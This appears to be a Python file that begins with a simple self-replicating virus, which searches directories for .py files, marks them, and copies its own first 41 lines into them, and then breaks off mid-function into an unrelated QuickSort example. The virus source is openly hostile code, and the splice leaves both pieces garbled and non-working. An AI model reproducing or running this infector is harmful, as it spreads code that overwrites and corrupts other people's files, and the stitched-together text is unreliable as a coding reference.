#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 implementation of QuickSort 
  
  
# Function to find the partition position
def partition(arr, l, h):
  low, high = l, h
  if l != h and l < h:
    # Choose the leftmost element as pivot
    pivot = arr[l]
    low = low+1
    # Traverse through all elements
    # compare each element with pivot
    while low <= high:
      if arr[high] < pivot and arr[low] > pivot:
        arr[high], arr[low] = arr[low], arr[high]
      if not arr[low] > pivot:
        low += 1
      if not arr[high] < pivot:
        high -= 1
  arr[l], arr[high] = arr[high], arr[l]
  # Return the position from where partition is done
  return high
  
# Function to perform quicksort
def quick_sort(array, low, high):
  if low < high:
  
      # Find pivot element such that
      # element smaller than pivot are on the left
      # element greater than pivot are on the right
      pi = partition(array, low, high)
  
      # Recursive call on the left of pivot
      quick_sort(array, low, pi - 1)
  
      # Recursive call on the right of pivot
      quick_sort(array, pi + 1, high)
  
  
          
# Driver code
array = [ 1, 7, 8, 9, 1, 2]
quick_sort(array, 0, len(array) - 1)
  
print(f'Sorted array: {array}')
      
# This code is contributed by Adnan Aliakbar